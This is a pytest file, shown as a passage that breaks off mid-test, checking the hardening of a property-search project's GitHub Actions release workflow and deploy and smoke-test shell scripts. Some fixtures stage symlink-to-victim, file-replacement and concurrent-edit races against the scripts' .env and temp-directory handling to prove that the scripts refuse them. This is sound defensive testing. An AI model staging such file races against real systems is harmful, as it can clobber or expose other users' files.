from __future__ import annotations

import os
import re
import signal
import subprocess
from pathlib import Path
import time

import pytest
import yaml


ROOT = Path(__file__).resolve().parents[1]
RELEASE_SUPERVISOR = (
    "/usr/libexec/propertyquarry-release-control/"
    "propertyquarry-release-supervisor-v2"
)
RELEASE_JOB_CONDITION = (
    "${{ github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main' "
    "&& inputs.run_launch_authority == true "
    "&& needs['propertyquarry-ordinary-ci-success'].result == 'success' }}"
)


class _StrictWorkflowLoader(yaml.SafeLoader):
    """Fail closed on YAML features that can disguise executable structure."""

    def compose_node(self, parent, index):  # type: ignore[no-untyped-def]
        if self.check_event(yaml.AliasEvent):
            raise yaml.constructor.ConstructorError(
                None, None, "workflow aliases are forbidden", self.peek_event().start_mark
            )
        return super().compose_node(parent, index)

    def construct_mapping(self, node, deep=False):  # type: ignore[no-untyped-def]
        if not isinstance(node, yaml.MappingNode):
            raise yaml.constructor.ConstructorError(
                None, None, "expected a workflow mapping", node.start_mark
            )
        mapping = {}
        for key_node, value_node in node.value:
            if key_node.tag == "tag:yaml.org,2002:merge":
                raise yaml.constructor.ConstructorError(
                    None, None, "workflow merge keys are forbidden", key_node.start_mark
                )
            key = self.construct_object(key_node, deep=deep)
            try:
                duplicate = key in mapping
            except TypeError as exc:
                raise yaml.constructor.ConstructorError(
                    None, None, "workflow mapping keys must be scalar", key_node.start_mark
                ) from exc
            if duplicate:
                raise yaml.constructor.ConstructorError(
                    None, None, f"duplicate workflow key: {key!r}", key_node.start_mark
                )
            mapping[key] = self.construct_object(value_node, deep=deep)
        return mapping


def _strict_workflow_document(workflow: str) -> dict[str, object]:
    document = yaml.load(workflow, Loader=_StrictWorkflowLoader)
    assert type(document) is dict
    return document


def _expected_release_supervisor_run(operation: str) -> str:
    assert operation in {"release-preflight", "release-run"}
    lines = [
        'exec 9<<<"${ACTIONS_ID_TOKEN_REQUEST_TOKEN:?missing GitHub OIDC bearer}"',
        "unset ACTIONS_ID_TOKEN_REQUEST_TOKEN",
        "exec /usr/bin/env -i \\",
        "  PATH=/usr/sbin:/usr/bin:/sbin:/bin \\",
        "  HOME=/nonexistent \\",
        "  LANG=C \\",
        "  LC_ALL=C \\",
        '  ACTIONS_ID_TOKEN_REQUEST_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}" \\',
        "  PROPERTYQUARRY_OIDC_TOKEN_FD=9 \\",
        '  GITHUB_REPOSITORY="${GITHUB_REPOSITORY}" \\',
        '  GITHUB_REF="${GITHUB_REF}" \\',
        '  GITHUB_SHA="${GITHUB_SHA}" \\',
        '  GITHUB_WORKFLOW_REF="${GITHUB_WORKFLOW_REF}" \\',
        '  GITHUB_WORKFLOW_SHA="${GITHUB_WORKFLOW_SHA}" \\',
        '  GITHUB_RUN_ID="${GITHUB_RUN_ID}" \\',
        '  GITHUB_RUN_ATTEMPT="${GITHUB_RUN_ATTEMPT}" \\',
        '  GITHUB_JOB="${GITHUB_JOB}" \\',
        f"  {RELEASE_SUPERVISOR} \\",
        f"    {operation}",
    ]
    return "\n".join(lines) + "\n"


def _assert_exact_v2_release_job(workflow: str) -> dict[str, object]:
    document = _strict_workflow_document(workflow)
    assert "env" not in document
    assert "defaults" not in document
    jobs = document.get("jobs")
    assert type(jobs) is dict
    release_job = jobs.get("propertyquarry-release-v2")
    assert type(release_job) is dict
    for job_name, candidate_job in jobs.items():
        assert type(job_name) is str
        assert type(candidate_job) is dict
        if job_name == "propertyquarry-release-v2":
            continue
        runner = candidate_job.get("runs-on")
        runner_labels = runner if type(runner) is list else [runner]
        assert "propertyquarry-release-controller-v2" not in runner_labels
        assert "propertyquarry-release-controller-v2" not in yaml.safe_dump(runner)
        assert RELEASE_SUPERVISOR not in yaml.safe_dump(candidate_job)
    assert set(release_job) == {
        "needs",
        "if",
        "timeout-minutes",
        "concurrency",
        "environment",
        "permissions",
        "runs-on",
        "steps",
    }
    assert release_job["needs"] == ["propertyquarry-ordinary-ci-success"]
    assert release_job["if"] == RELEASE_JOB_CONDITION
    assert type(release_job["timeout-minutes"]) is int
    assert release_job["timeout-minutes"] == 180
    assert release_job["concurrency"] == {
        "group": "propertyquarry-release-lifecycle-v2",
        "cancel-in-progress": False,
    }
    assert release_job["environment"] == {"name": "propertyquarry-production"}
    assert release_job["permissions"] == {"contents": "none", "id-token": "write"}
    assert release_job["runs-on"] == [
        "self-hosted",
        "propertyquarry-release-controller-v2",
    ]
    steps = release_job["steps"]
    assert type(steps) is list and len(steps) == 2
    expected_steps = (
        (
            "Request non-authorizing release preflight from the installed supervisor",
            "release-preflight",
        ),
        (
            "Request the atomic release lifecycle from the installed supervisor",
            "release-run",
        ),
    )
    for step, (name, operation) in zip(steps, expected_steps, strict=True):
        assert type(step) is dict
        assert set(step) == {"name", "shell", "run"}
        assert step["name"] == name
        assert step["shell"] == "/bin/bash --noprofile --norc -p -euo pipefail {0}"
        assert step["run"] == _expected_release_supervisor_run(operation)
    return release_job


def _read(path: str) -> str:
    return (ROOT / path).read_text(encoding="utf-8")


def test_smoke_runtime_keeps_candidate_jobs_read_only_and_checkout_credentials_ephemeral(
) -> None:
    document = _strict_workflow_document(_read(".github/workflows/smoke-runtime.yml"))

    assert document.get("permissions") == {"contents": "read"}
    jobs = document.get("jobs")
    assert type(jobs) is dict
    checkout_steps = []
    for job_name, job in jobs.items():
        assert type(job_name) is str
        assert type(job) is dict
        steps = job.get("steps", [])
        assert type(steps) is list
        for step in steps:
            assert type(step) is dict
            uses = step.get("uses")
            if type(uses) is str and uses.startswith("actions/checkout@"):
                checkout_steps.append((job_name, step))

    assert checkout_steps
    for job_name, step in checkout_steps:
        checkout_inputs = step.get("with")
        assert type(checkout_inputs) is dict, (
            f"{job_name} must configure checkout to avoid persisting a repository token"
        )
        assert checkout_inputs.get("persist-credentials") is False, (
            f"{job_name} must not persist checkout credentials into candidate Git config"
        )


def _assert_external_deploy_controller_handoff(script: str) -> None:
    for required in (
        "/usr/libexec/propertyquarry-release-control/propertyquarry-deploy-controller",
        "/etc/propertyquarry/release-control/external-deploy-controller.v1.json",
        "--controller-self-fd",
        "--external-manifest-fd",
        "--signed-request-fd",
        "--candidate-root-fd",
        "--controller-owns-all-privileged-actions",
        "--contain-before-candidate-validation",
        "--forbid-caller-compose",
        "--forbid-candidate-output-authority",
        "/usr/bin/env -i",
    ):
        assert required in script
    for forbidden in (
        "propertyquarry_deploy_controller_guard.py",
        "docker compose",
        "docker-compose",
        "psql",
        "PROPERTYQUARRY_DEPLOY_PYTHON_BIN",
    ):
        assert forbidden not in script


def _workflow_job(workflow: str, job_name: str) -> str:
    marker = f"  {job_name}:\n"
    start = workflow.index(marker)
    body_start = start + len(marker)
    next_job = re.search(r"^  [a-zA-Z0-9_-]+:\n", workflow[body_start:], flags=re.MULTILINE)
    end = body_start + next_job.start() if next_job else len(workflow)
    return workflow[start:end]


def _bash_function(source: str, name: str) -> str:
    match = re.search(
        rf"^{re.escape(name)}\(\) \{{\n.*?^\}}\n",
        source,
        flags=re.MULTILINE | re.DOTALL,
    )
    assert match is not None, f"missing bash function {name}"
    return match.group(0)


def _run_schema_quiesce_scenario(
    tmp_path: Path,
    *,
    scenario: str,
    api_state: str,
    worker_state: str,
    scheduler_state: str,
) -> tuple[subprocess.CompletedProcess[str], list[str]]:
    event_log = tmp_path / "events.log"
    shell = r'''
set -euo pipefail

declare -A SERVICE_STATE=(
  [api]="${INITIAL_API_STATE}"
  [worker]="${INITIAL_WORKER_STATE}"
  [scheduler]="${INITIAL_SCHEDULER_STATE}"
  [render]="stopped"
  [migrate]="stopped"
)

event() {
  printf '%s\n' "$*" >> "${EVENT_LOG}"
}

container_state_line() {
  local service="${1#cid-}"
  local state="${SERVICE_STATE[${service}]:-missing}"
  case "${state}" in
    running) printf 'running|healthy' ;;
    restarting) printf 'restarting|starting' ;;
    paused) printf 'paused|healthy' ;;
    created) printf 'created|none' ;;
    removing) printf 'removing|none' ;;
    stopped) printf 'exited|none' ;;
    dead) printf 'dead|none' ;;
  esac
}

fake_compose() {
  local action="$1"
  local skip_next=0
  local arg=""
  local service=""
  shift
  if [[ "${action}" == "ps" ]]; then
    for arg in "$@"; do
      service="${arg}"
    done
    if [[ "${SERVICE_STATE[${service}]:-missing}" != "missing" ]]; then
      printf 'cid-%s' "${service}"
    fi
    return 0
  fi
  event "compose ${action} $*"
  if [[ "${SCENARIO}" == "quiesce-failure" && "${action}" == "stop" ]]; then
    SERVICE_STATE[api]="stopped"
    return 1
  fi
  if [[ "${SCENARIO}" == "paused-writer-stuck" && "${action}" == "stop" ]]; then
    SERVICE_STATE[scheduler]="stopped"
    return 0
  fi
  case "${action}" in
    stop)
      for arg in "$@"; do
        if [[ "${skip_next}" == "1" ]]; then
          skip_next=0
          continue
        fi
        if [[ "${arg}" == "--timeout" ]]; then
          skip_next=1
          continue
        fi
        SERVICE_STATE["${arg}"]="stopped"
      done
      ;;
    start)
      for arg in "$@"; do
        SERVICE_STATE["${arg}"]="running"
      done
      ;;
    *)
      return 2
      ;;
  esac
}

DC=(fake_compose)
source "${QUIESCE_HELPER}"
PROPERTYQUARRY_ALLOWED_DATABASE_WRITER_CONTAINER_NAMES=(api worker scheduler)
database_writer_inventory_lines() {
  if [[ "${SERVICE_STATE[api]}" != "stopped" ]]; then printf 'cid-api|api\n'; fi
  if [[ "${SERVICE_STATE[worker]}" != "stopped" ]]; then printf 'cid-worker|worker\n'; fi
  if [[ "${SERVICE_STATE[scheduler]}" != "stopped" ]]; then printf 'cid-scheduler|scheduler\n'; fi
}
database_writer_session_inventory_lines() { return 0; }
stop_database_writer_container() { return 0; }
database_writer_container_is_active() { return 1; }
propertyquarry_install_schema_quiesce_traps
propertyquarry_quiesce_schema_writers \
  api api worker worker scheduler scheduler render render migrate migrate 30 2

case "${SCENARIO}" in
  success)
    event migration-completed
    propertyquarry_mark_schema_migration_committed
    SERVICE_STATE[api]="running"
    event candidate-api-ready
    SERVICE_STATE[worker]="running"
    event candidate-worker-ready
    SERVICE_STATE[scheduler]="running"
    event candidate-scheduler-ready
    propertyquarry_finish_schema_quiesce
    ;;
  precommit-failure)
    SERVICE_STATE[migrate]="running"
    event migration-failed
    false
    ;;
  paused-migrator-failure)
    SERVICE_STATE[migrate]="paused"
    event migration-failed
    false
    ;;
  postcommit-failure)
    event migration-completed
    propertyquarry_mark_schema_migration_committed
    SERVICE_STATE[api]="running"
    event candidate-api-started
    false
    ;;
  *)
    exit 64
    ;;
esac
'''
    env = {
        **os.environ,
        "QUIESCE_HELPER": str(ROOT / "scripts/propertyquarry_deploy_quiesce.sh"),
        "EVENT_LOG": str(event_log),
        "SCENARIO": scenario,
        "INITIAL_API_STATE": api_state,
        "INITIAL_WORKER_STATE": worker_state,
        "INITIAL_SCHEDULER_STATE": scheduler_state,
    }
    completed = subprocess.run(
        ["bash", "-c", shell],
        cwd=ROOT,
        env=env,
        text=True,
        capture_output=True,
        check=False,
    )
    events = event_log.read_text(encoding="utf-8").splitlines() if event_log.exists() else []
    return completed, events


def test_make_deploy_uses_hardened_propertyquarry_wrapper() -> None:
    makefile = _read("Makefile")

    assert "./scripts/deploy_propertyquarry.sh" in makefile
    assert "PROPERTYQUARRY_COMPOSE_FILE" not in makefile.split("\ndeploy:\n", 1)[1].split(
        "\n\ndeploy-legacy-ea-stack:", 1
    )[0]
    assert "PROPERTYQUARRY_USE_LEGACY_STACK=1 bash scripts/deploy.sh" in makefile
    assert "docker compose -f docker-compose.property.yml up -d --build --remove-orphans" not in makefile


def test_smoke_runtime_runs_unprivileged_local_propertyquarry_browser_contracts() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    browser_test = _read("tests/e2e/test_propertyquarry_greenfield_browser.py")
    browser_job = _workflow_job(workflow, "propertyquarry-browser-contracts")
    product_browser_job = _workflow_job(workflow, "product-browser-e2e")

    assert workflow.count("\n  product-browser-e2e:\n") == 1
    assert "\n  push:\n" in workflow
    assert "\n  pull_request:\n" in workflow
    assert "\n  workflow_dispatch:\n" in workflow
    assert "permissions:\n      contents: read" in browser_job
    assert "persist-credentials: false" in browser_job
    assert "python -m playwright install --with-deps chromium" in browser_job
    assert re.findall(r"tests/e2e/test_propertyquarry_[a-z0-9_]+\.py", browser_job) == [
        "tests/e2e/test_propertyquarry_greenfield_browser.py",
        "tests/e2e/test_propertyquarry_public_tour_browser.py",
    ]
    assert "python -m pytest -q" in browser_job
    assert "make property-release-gates" not in browser_job
    assert "secrets." not in browser_job
    assert "vars." not in browser_job
    assert "\n    environment:" not in browser_job
    assert "\n    if:" not in browser_job
    assert "permissions:\n      contents: read" in product_browser_job
    assert "runs-on: ubuntu-latest" in product_browser_job
    assert "fail-fast: false" in product_browser_job
    assert "browser-engine: [chromium, firefox, webkit]" in product_browser_job
    assert "persist-credentials: false" in product_browser_job
    assert 'python -m playwright install --with-deps "${{ matrix.browser-engine }}"' in product_browser_job
    assert "PROPERTYQUARRY_CORE_BROWSER_ENGINE: ${{ matrix.browser-engine }}" in product_browser_job
    assert "PYTHONPATH=ea EA_STORAGE_BACKEND=memory python -m pytest -q" in product_browser_job
    assert (
        "tests/e2e/test_propertyquarry_greenfield_browser.py::"
        "test_propertyquarry_workbench_candidate_history_stays_in_place"
        in product_browser_job
    )
    assert (
        "tests/e2e/test_propertyquarry_greenfield_browser.py::"
        "test_propertyquarry_flagship_operating_loop_in_browser"
        in product_browser_job
    )
    assert browser_test.count('browser_base_url = f"http://propertyquarry.localhost:{port}"') == 1
    assert 'monkeypatch.setenv("EA_PUBLIC_APP_BASE_URL", browser_base_url)' in browser_test
    assert 'browser_base_url = f"http://propertyquarry.com:{port}"' not in browser_test
    assert 'browser_base_url = f"http://127.0.0.1:{port}"' not in browser_test
    assert "/etc/hosts" not in product_browser_job
    assert 'echo "127.0.0.1 propertyquarry.com"' not in product_browser_job
    assert "--host-resolver-rules" not in browser_test
    assert "network.dns.localDomains" not in browser_test
    assert "secrets." not in product_browser_job
    assert "vars." not in product_browser_job
    assert "\n    environment:" not in product_browser_job
    assert "\n    if:" not in product_browser_job
    assert "propertyquarry-live-release-gates" not in product_browser_job


def test_smoke_runtime_runs_fail_closed_postgres_production_storage_browser_lane() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    job = _workflow_job(workflow, "propertyquarry-postgres-browser-e2e")
    smoke = _read("scripts/smoke_property_postgres.sh")
    browser_test = _read("tests/e2e/test_propertyquarry_postgres_browser.py")
    bootstrap = _read("scripts/propertyquarry_postgres_browser_bootstrap.py")
    property_web_dockerfile = _read("ea/Dockerfile.property-web")

    assert workflow.count("\n  propertyquarry-postgres-browser-e2e:\n") == 1
    assert "permissions:\n      contents: read" in job
    assert "runs-on: ubuntu-latest" in job
    assert "timeout-minutes: 45" in job
    assert "persist-credentials: false" in job
    assert "PROPERTYQUARRY_ENABLE_LEGACY_RUNTIME_SURFACES: \"0\"" in job
    assert "EA_API_TOKEN: propertyquarry-postgres-browser-${{ github.run_id }}-${{ github.run_attempt }}" in job
    assert "POSTGRES_PASSWORD: propertyquarry-browser-${{ github.run_id }}-${{ github.run_attempt }}" in job
    assert "python -m playwright install --with-deps chromium" in job
    assert "bash scripts/smoke_property_postgres.sh --browser-e2e" in job
    assert "continue-on-error:" not in job
    assert "|| true" not in job
    assert "secrets." not in job
    assert "vars." not in job

    for required in (
        "set -euo pipefail",
        "docker-compose.property.yml",
        'COMPOSE_PROJECT_NAME="${COMPOSE_PROJECT_NAME:-propertyquarry-postgres-smoke-${smoke_suffix}}"',
        'PROPERTYQUARRY_API_CONTAINER_NAME="${PROPERTYQUARRY_API_CONTAINER_NAME:-propertyquarry-postgres-smoke-api-${smoke_suffix}}"',
        'PROPERTYQUARRY_DB_CONTAINER_NAME="${PROPERTYQUARRY_DB_CONTAINER_NAME:-propertyquarry-postgres-smoke-db-${smoke_suffix}}"',
        'PROPERTYQUARRY_MIGRATE_CONTAINER_NAME="${PROPERTYQUARRY_MIGRATE_CONTAINER_NAME:-propertyquarry-postgres-smoke-migrate-${smoke_suffix}}"',
        '"/tmp/propertyquarry-postgres-smoke.${BASHPID}.XXXXXXXX"',
        'app_probe_file="${smoke_tmp_dir}/app-probe.html"',
        'browser_session_file="${smoke_tmp_dir}/browser-session.json"',
        'trap \'cleanup_on_exit "$?"\' EXIT',
        "trap 'terminate_from_signal 143' TERM",
        "snapshot_smoke_env",
        "refusing nonregular pre-existing property postgres smoke .env",
        'exec {source_fd}<"${source_path}"',
        'stat -Lc \'%d:%i\' -- "/proc/self/fd/${source_fd}"',
        'sha256sum -- "/proc/self/fd/${source_fd}"',
        'mktemp "${smoke_tmp_dir}/compose.env.XXXXXXXX"',
        "smoke_env_is_exact",
        'done < "${smoke_env_file}"',
        'compose_cleanup_armed=1',
        'set_env_value "EA_RUNTIME_MODE" "prod"',
        'set_env_value "EA_STORAGE_BACKEND" "postgres"',
        'set_env_value "EA_ALLOW_LOOPBACK_NO_AUTH" "0"',
        'od -An -N32 -tx1 /dev/urandom',
        '[[ "${smoke_erasure_secret}" =~ ^[0-9a-f]{64}$ ]]',
        'export PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET="${smoke_erasure_secret}"',
        'export PROPERTYQUARRY_WORKER_HEARTBEAT_REQUIRED="0"',
        'export PROPERTYQUARRY_SCHEDULER_HEARTBEAT_REQUIRED="0"',
        'set_env_value "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET" "${smoke_erasure_secret}"',
        'set_env_value "PROPERTYQUARRY_ENABLE_LEGACY_RUNTIME_SURFACES" "0"',
        'set_env_value "PROPERTYQUARRY_WORKER_HEARTBEAT_REQUIRED" "0"',
        'set_env_value "PROPERTYQUARRY_SCHEDULER_HEARTBEAT_REQUIRED" "0"',
        'if [[ "${ready_reason}" == "${expected_ready_reason}" ]]',
        'runtime_mode="$(docker exec',
        'runtime_storage="$(docker exec',
        'legacy_runtime_surfaces="$(docker exec',
        'worker_heartbeat_required="$(docker exec',
        'scheduler_heartbeat_required="$(docker exec',
        "PROPERTYQUARRY_POSTGRES_BROWSER_E2E=1",
        "propertyquarry_postgres_browser_bootstrap.py",
        "PROPERTYQUARRY_POSTGRES_BROWSER_SESSION_FILE",
        "tests/e2e/test_propertyquarry_postgres_browser.py",
    ):
        assert required in smoke
    assert "postgres_ready*" not in smoke
    assert "sed -i" not in smoke
    assert 'docker exec "${api_container}" /bin/sh' not in smoke
    assert 'docker exec "${api_container}" /usr/local/bin/python -c' in smoke
    assert "multiline env values are not supported" in smoke
    assert "/tmp/propertyquarry_app_probe.html" not in smoke
    assert "/tmp/propertyquarry-postgres-browser-session.json" not in smoke
    assert "browser_session_dir=" not in smoke
    assert smoke.count('--env-file "${smoke_env_file}"') == 2
    for forbidden in (
        "created_env=",
        "env_had_file=",
        "env_backup=",
        "env_working_identity=",
        "prepare_smoke_env",
        "restore_original_env",
        '.env.propertyquarry.restore.',
        '.env.propertyquarry.seed.',
        'mv -T -- "${temp_file}" "${ROOT}/.env"',
        'rm -f -- "${ROOT}/.env"',
    ):
        assert forbidden not in smoke
    private_update = _bash_function(smoke, "set_env_value")
    cleanup = _bash_function(smoke, "cleanup")
    assert '"${ROOT}/.env"' not in private_update
    assert '"${ROOT}/.env"' not in cleanup
    assert cleanup.index('"${DC[@]}" down -v') < cleanup.index(
        "cleanup_smoke_tmp_dir"
    )
    assert smoke.index('DC=(\n    docker compose\n    --env-file "${smoke_env_file}"') < (
        smoke.index("compose_cleanup_armed=1")
    )
    assert smoke.index('DC=(\n    docker-compose\n    --env-file "${smoke_env_file}"') < (
        smoke.index("compose_cleanup_armed=1")
    )

    for required in (
        "PROPERTYQUARRY_POSTGRES_BROWSER_BASE_URL",
        "PROPERTYQUARRY_POSTGRES_BROWSER_EXPECTED_READY_REASON",
        "PROPERTYQUARRY_POSTGRES_BROWSER_SESSION_FILE",
        'session_receipt.get("provisioning_scope") == "internal_ci_only"',
        'client.get("/health/ready")',
        'ready.get("reason") == expected_ready_reason',
        'version.get("storage_backend") == "postgres"',
        'registration.status_code == 503',
        '"verification_token" not in registration.text',
        'client.get("/app/properties")',
        '"X-EA-API-Token": api_token',
        '"ea_workspace_session": access_token',
        '"/v1/onboarding/property-search/preferences"',
        'authenticated_page.goto(f"{base_url}/app/search"',
        'authenticated_page.goto(f"{base_url}/app/properties"',
        'authenticated_page.locator("[data-property-decision-workbench]")',
    ):
        assert required in browser_test
    assert "TestClient" not in browser_test
    assert "create_app" not in browser_test
    assert 'client.post("/v1/register/verify"' not in browser_test

    for required in (
        "PROPERTYQUARRY_POSTGRES_BROWSER_E2E",
        'runtime_mode != "prod" or storage_backend != "postgres"',
        "container.onboarding.start_workspace",
        "issue_workspace_access_session",
        'source_kind="postgres_browser_internal_ci_bootstrap"',
        '"provisioning_scope": "internal_ci_only"',
        "_secure_write",
        "os.O_EXCL",
        'getattr(os, "O_NOFOLLOW", 0)',
        "required=True",
    ):
        assert required in bootstrap
    assert "/tmp/propertyquarry-postgres-browser-session.json" not in bootstrap
    assert (
        "COPY scripts/propertyquarry_postgres_browser_bootstrap.py "
        "/app/scripts/propertyquarry_postgres_browser_bootstrap.py"
        in property_web_dockerfile
    )


def test_property_postgres_smoke_private_workspace_round_trip() -> None:
    source = _read("scripts/smoke_property_postgres.sh")
    create_function = _bash_function(source, "create_smoke_tmp_dir")
    validate_function = _bash_function(source, "smoke_tmp_is_exact")
    cleanup_function = _bash_function(source, "cleanup_smoke_tmp_dir")
    completed = subprocess.run(
        [
            "/bin/bash",
            "--noprofile",
            "--norc",
            "-eu",
            "-c",
            (
                f"{create_function}\n"
                f"{validate_function}\n"
                f"{cleanup_function}\n"
                "smoke_tmp_dir=''\n"
                "smoke_tmp_identity=''\n"
                "create_smoke_tmp_dir\n"
                "candidate=\"${smoke_tmp_dir}\"\n"
                "smoke_tmp_is_exact\n"
                "stat -c '%a' -- \"${candidate}\"\n"
                "cleanup_smoke_tmp_dir\n"
                "[[ ! -e \"${candidate}\" && ! -L \"${candidate}\" ]]\n"
                "[[ -z \"${smoke_tmp_dir}\" && -z \"${smoke_tmp_identity}\" ]]\n"
            ),
        ],
        cwd=ROOT,
        check=False,
        capture_output=True,
        text=True,
    )

    assert completed.returncode == 0, completed.stderr
    assert completed.stdout == "700\n"
    assert completed.stderr == ""


def test_property_postgres_smoke_cleanup_refuses_replaced_workspace(
    tmp_path: Path,
) -> None:
    source = _read("scripts/smoke_property_postgres.sh")
    temporary = tmp_path / "propertyquarry-postgres-smoke.fixture"
    original = tmp_path / "original"
    temporary.mkdir(mode=0o700)
    expected_identity = f"{temporary.stat().st_dev}:{temporary.stat().st_ino}"
    temporary.rename(original)
    temporary.mkdir(mode=0o700)
    (temporary / "replacement-marker").write_text(
        "preserve\n",
        encoding="utf-8",
    )
    validate_function = _bash_function(source, "smoke_tmp_is_exact").replace(
        "    /tmp/propertyquarry-postgres-smoke.*)",
        f'    "{temporary}")',
    )
    cleanup_function = _bash_function(source, "cleanup_smoke_tmp_dir")
    completed = subprocess.run(
        [
            "/bin/bash",
            "--noprofile",
            "--norc",
            "-eu",
            "-c",
            (
                f"{validate_function}\n"
                f"{cleanup_function}\n"
                "smoke_tmp_dir=\"$1\"\n"
                "smoke_tmp_identity=\"$2\"\n"
                "if cleanup_smoke_tmp_dir; then exit 99; else exit 0; fi\n"
            ),
            "bash",
            str(temporary),
            expected_identity,
        ],
        cwd=ROOT,
        check=False,
        capture_output=True,
        text=True,
    )

    assert completed.returncode == 0
    assert completed.stdout == ""
    assert completed.stderr == (
        "refusing cleanup of replaced property postgres smoke "
        "temporary directory\n"
    )
    assert (temporary / "replacement-marker").read_text(
        encoding="utf-8"
    ) == "preserve\n"
    assert original.is_dir()


@pytest.mark.parametrize("entry_kind", ("symlink", "directory", "fifo"))
def test_property_postgres_smoke_rejects_preexisting_nonregular_env_before_snapshot(
    tmp_path: Path,
    entry_kind: str,
) -> None:
    source = _read("scripts/smoke_property_postgres.sh")
    create_function = _bash_function(source, "create_smoke_tmp_dir")
    validate_function = _bash_function(source, "smoke_tmp_is_exact")
    private_env_function = _bash_function(source, "smoke_env_is_exact")
    snapshot_function = _bash_function(source, "snapshot_smoke_env")
    cleanup_function = _bash_function(source, "cleanup_smoke_tmp_dir")
    root = tmp_path / "root"
    root.mkdir()
    victim = tmp_path / "victim"
    victim.write_text("preserve=true\n", encoding="utf-8")
    env_path = root / ".env"
    if entry_kind == "symlink":
        env_path.symlink_to(victim)
    elif entry_kind == "directory":
        env_path.mkdir()
        (env_path / "marker").write_text("preserve\n", encoding="utf-8")
    else:
        os.mkfifo(env_path)

    completed = subprocess.run(
        [
            "/bin/bash",
            "--noprofile",
            "--norc",
            "-eu",
            "-c",
            (
                f"{create_function}\n"
                f"{validate_function}\n"
                f"{private_env_function}\n"
                f"{snapshot_function}\n"
                f"{cleanup_function}\n"
                "ROOT=\"$1\"\n"
                "smoke_tmp_dir=''\n"
                "smoke_tmp_identity=''\n"
                "smoke_env_file=''\n"
                "smoke_env_identity=''\n"
                "create_smoke_tmp_dir\n"
                "if snapshot_smoke_env; then\n"
                "  exit 99\n"
                "else\n"
                "  snapshot_status=\"$?\"\n"
                "fi\n"
                "[[ \"${snapshot_status}\" -eq 2 ]]\n"
                "cleanup_smoke_tmp_dir\n"
            ),
            "bash",
            str(root),
        ],
        cwd=ROOT,
        check=False,
        capture_output=True,
        text=True,
    )

    assert completed.returncode == 0
    assert completed.stdout == ""
    assert completed.stderr == (
        "refusing nonregular pre-existing property postgres smoke .env\n"
    )
    if entry_kind == "symlink":
        assert env_path.is_symlink()
        assert os.readlink(env_path) == str(victim)
    elif entry_kind == "directory":
        assert (env_path / "marker").read_text(encoding="utf-8") == "preserve\n"
    else:
        assert env_path.exists()
        assert env_path.stat().st_mode & 0o170000 == 0o010000
    assert victim.read_text(encoding="utf-8") == "preserve=true\n"


def test_property_postgres_smoke_private_env_snapshot_and_update_round_trip(
    tmp_path: Path,
) -> None:
    source = _read("scripts/smoke_property_postgres.sh")
    create_function = _bash_function(source, "create_smoke_tmp_dir")
    validate_function = _bash_function(source, "smoke_tmp_is_exact")
    private_env_function = _bash_function(source, "smoke_env_is_exact")
    snapshot_function = _bash_function(source, "snapshot_smoke_env")
    set_function = _bash_function(source, "set_env_value")
    cleanup_function = _bash_function(source, "cleanup_smoke_tmp_dir")
    root = tmp_path / "root"
    root.mkdir()
    (root / ".env.example").write_text(
        "UNCHANGED=true\nTARGET=old\n",
        encoding="utf-8",
    )

    completed = subprocess.run(
        [
            "/bin/bash",
            "--noprofile",
            "--norc",
            "-eu",
            "-c",
            (
                f"{create_function}\n"
                f"{validate_function}\n"
                f"{private_env_function}\n"
                f"{snapshot_function}\n"
                f"{set_function}\n"
                f"{cleanup_function}\n"
                "ROOT=\"$1\"\n"
                "smoke_tmp_dir=''\n"
                "smoke_tmp_identity=''\n"
                "smoke_env_file=''\n"
                "smoke_env_identity=''\n"
                "create_smoke_tmp_dir\n"
                "workspace=\"${smoke_tmp_dir}\"\n"
                "snapshot_smoke_env\n"
                "set_env_value TARGET replacement\n"
                "smoke_env_is_exact\n"
                "stat -c '%a' -- \"${workspace}\" \"${smoke_env_file}\"\n"
                "cat -- \"${smoke_env_file}\"\n"
                "[[ ! -e \"${ROOT}/.env\" && ! -L \"${ROOT}/.env\" ]]\n"
                "cleanup_smoke_tmp_dir\n"
                "[[ ! -e \"${workspace}\" && ! -L \"${workspace}\" ]]\n"
            ),
            "bash",
            str(root),
        ],
        cwd=ROOT,
        check=False,
        capture_output=True,
        text=True,
    )

    assert completed.returncode == 0, completed.stderr
    assert completed.stdout == (
        "700\n"
        "600\n"
        "UNCHANGED=true\n"
        "TARGET=replacement\n"
    )
    assert completed.stderr == ""
    assert not (root / ".env").exists()


@pytest.mark.parametrize("mutation", ("replace_name", "edit_in_place"))
def test_property_postgres_smoke_rejects_canonical_env_change_during_snapshot(
    tmp_path: Path,
    mutation: str,
) -> None:
    source = _read("scripts/smoke_property_postgres.sh")
    create_function = _bash_function(source, "create_smoke_tmp_dir")
    validate_function = _bash_function(source, "smoke_tmp_is_exact")
    private_env_function = _bash_function(source, "smoke_env_is_exact")
    snapshot_function = _bash_function(source, "snapshot_smoke_env")
    cleanup_function = _bash_function(source, "cleanup_smoke_tmp_dir")
    root = tmp_path / "root"
    root.mkdir()
    env_path = root / ".env"
    env_path.write_text("original=true\n", encoding="utf-8")
    displaced = root / "displaced-original"
    replacement = root / "replacement"
    replacement.write_text("replacement=true\n", encoding="utf-8")

    completed = subprocess.run(
        [
            "/bin/bash",
            "--noprofile",
            "--norc",
            "-eu",
            "-c",
            (
                f"{create_function}\n"
                f"{validate_function}\n"
                f"{private_env_function}\n"
                f"{snapshot_function}\n"
                f"{cleanup_function}\n"
                "ROOT=\"$1\"\n"
                "MUTATION=\"$2\"\n"
                "DISPLACED=\"$3\"\n"
                "REPLACEMENT=\"$4\"\n"
                "smoke_tmp_dir=''\n"
                "smoke_tmp_identity=''\n"
                "smoke_env_file=''\n"
                "smoke_env_identity=''\n"
                "create_smoke_tmp_dir\n"
                "cp() {\n"
                "  /usr/bin/cp \"$@\"\n"
                "  case \"$2\" in\n"
                "    /proc/self/fd/*)\n"
                "      if [[ \"${MUTATION}\" == replace_name ]]; then\n"
                "        /usr/bin/mv -T -- \"${ROOT}/.env\" \"${DISPLACED}\"\n"
                "        /usr/bin/mv -T -- \"${REPLACEMENT}\" \"${ROOT}/.env\"\n"
                "      else\n"
                "        printf 'concurrent=true\\n' >> \"${ROOT}/.env\"\n"
                "      fi\n"
                "      ;;\n"
                "  esac\n"
                "}\n"
                "if snapshot_smoke_env; then\n"
                "  exit 99\n"
